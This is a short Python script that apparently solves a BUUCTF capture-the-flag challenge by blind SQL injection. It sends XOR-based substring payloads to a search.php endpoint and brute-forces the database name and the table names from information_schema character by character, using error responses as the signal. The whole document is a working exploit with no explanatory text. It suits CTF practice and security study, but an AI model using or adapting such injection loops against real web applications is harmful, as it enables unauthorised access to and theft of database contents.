import requests


url = "http://e101cabf-12b3-45df-9499-0723aa28ec7b.node5.buuoj.cn:81/search.php"

result = ''


for i in range(0,20):
    for j in "{}-_.abcdefghijklmnopqrstopqrstuvwxyz1234567890":
        payload = f"id=1^(substr(database(),{i},1)='{j}')"
        payload = f"id=1^(substr((select(table_name)from(information_schema.tables)where(table_schema)='geek'),{i},1)='{j}')"
        re = requests.get(url=url, params=payload)
        if 'ERROR' in re.text:
            result += j
            print(result)
            break
        print("!")


"""
payload = f"id=1^(substr(database(),4,1)='e')"
re = requests.get(url=url, params=payload)
time = re.elapsed.total_seconds()
print(f"{time}")
print(re.text)
"""
